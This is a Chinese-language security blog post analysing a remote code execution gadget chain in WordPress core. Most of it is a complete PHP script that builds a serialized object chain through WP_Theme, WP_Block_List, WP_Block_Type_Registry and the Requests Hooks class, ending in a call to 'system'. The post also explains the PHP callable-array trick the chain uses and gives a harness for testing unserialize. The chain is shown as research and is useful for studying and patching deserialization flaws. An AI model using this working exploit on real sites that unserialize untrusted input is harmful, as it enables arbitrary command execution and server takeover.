---
title: "WordPress Core RCE Gadget 分析"
date: 2023-10-26T14:38:24+08:00
lastmod: 2023-10-26T14:38:24+08:00
draft: false
author: "X1r0z"

tags: ['wordpress', 'rce']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

WordPress Core RCE Gadget 分析

<!--more-->

https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/

前些天在 p 牛知识星球看到的, 当时跟着上面的分析过程自己构造了一遍, 感觉思路确实很有意思

本来想写篇文章的, 但是那几天有点忙, 后边就把这个事给忘了 (

分享下自己构造的 gadget

```php
<?php

namespace WpOrg\Requests {
	class Session {
		public $url;
		public $headers;
		public $data;
		public $options;

		public function __construct( $url, $headers, $data, $options ) {
			$this->url     = $url;
			$this->headers = $headers;
			$this->data    = $data;
			$this->options = $options;
		}
	}

	class Hooks {
		protected $hooks;

		public function __construct() {
			$this->hooks = [
				'requests.before_request' => [
					'1' => [ [$this, "dispatch"] ]
				],
				'https://exp10it.cn/Name' => [
					'1' => ['system']
				]
			];
		}
	}
}

namespace {

	use WpOrg\Requests\Hooks;
	use WpOrg\Requests\Session;

	class WP_Theme {
		private $headers;
		private $parent;

		public function __construct( $headers, $parent ) {
			$this->headers = $headers;
			$this->parent  = $parent;
		}
	}

	class WP_Block_List {
		protected $blocks;
		protected $available_context;
		protected $registry;

		public function __construct( $blocks, $available_context, $registry ) {
			$this->blocks            = $blocks;
			$this->available_context = $available_context;
			$this->registry          = $registry;
		}
	}

	class WP_Block_Type_Registry {
		private $registered_block_types;

		public function __construct( $registered_block_types ) {
			$this->registered_block_types = $registered_block_types;
		}
	}

	$hooks_obj = new Hooks();

	$options = ['hooks' => $hooks_obj];

	$parent = new Session('https://exp10it.cn/', ['id'], [], $options);

	$wp_theme_another = new WP_Theme(null, $parent);

	$registry = new WP_Block_Type_Registry($wp_theme_another);

	$block = ['blockName' => 'Parent Theme'];
	$blocks = ['Name' => $block];

	$wp_block_list = new WP_Block_List($blocks, [], $registry);

	$wp_theme = new WP_Theme($wp_block_list, null);

	echo urlencode(serialize($wp_theme));

}
```

wpscan 原文讲的肯定比我清楚, 所以这里我就简单分享一下在构造 gadget 过程中用到的一个小 trick

我们都知道 PHP 7 支持可变函数, 通过可变函数可以调用一个类的静态方法, 这个在一些 CTF 题目里面也会遇到, 比如

```php
class A {
    public static function test() {
        echo 'hello a';
    }
}

$a = 'A::test'; // 调用 A 的 test 静态方法
$a(); // hello a
```

但是在 wordpress gadget 的构造过程中, 需要递归调用一次 `WpOrg\Requests\Hooks` 类的 dispatch 方法来将所有参数左移一位以方便控制参数的数量

而 dispatch 是一个普通的方法, 简单来说就是如下的场景

```php
class B {
    public function test() {
        echo 'hello b';
    }
}

$b = ...; // 控制 $b 使得能够调用 test 方法
$b();
```

这时候只需要将 $b 设置成一个数组, 数组的第一个位置是实例对象, 第二个位置是要调用的方法, 然后直接动态调用这个数组, 即可调用到 test 方法

```php
$b = [new B(), 'test'];
$b(); // hello b
```

同时这个 trick 对于调用静态方法也是适用的

```php
$c = ['A', 'test'];
$d = [new A(), 'test'];
$c(); // hello a
$d(); // hello a
```

有趣的是这个就在官方文档最底下, 但是不知道为啥 note 的评分是负的

[https://www.php.net/manual/zh/functions.variable-functions.php](https://www.php.net/manual/zh/functions.variable-functions.php)

所以最终 gadget Hooks 部分的 payload 大致就是如下这种形式

```php
class Hooks {
    protected $hooks;

    public function __construct() {
        $this->hooks = [
            'requests.before_request' => [
                '1' => [ [$this, "dispatch"] ]
            ],
            'https://exp10it.cn/Name' => [
                '1' => ['system']
            ]
        ];
    }
}
```

看了下 phpggc 的 payload, 它是弄了两个 Hooks 实例对象: $hooks 和 $hooks_recurse_once, 然后使得 $hooks 的 dispatch 去调用 $hooks_recurse_once 的 dispatch, 不过思路都是差不多的

最后说下如何调试 wordpress 的 gadget, 按照原文中写数据库的方法肯定可以, 但是比较麻烦, 因为是调试所以得越简单越好

只需要 require 当前目录下的 `wp-load.php`, 然后调用 `wp()`函数初始化, 之后直接调用 unserialize 进行测试即可

```php
<?php

require_once __DIR__ . '/wp-load.php';

// Set up the WordPress query.
wp();

$a = unserialize(urldecode("..."));

echo $a;
```

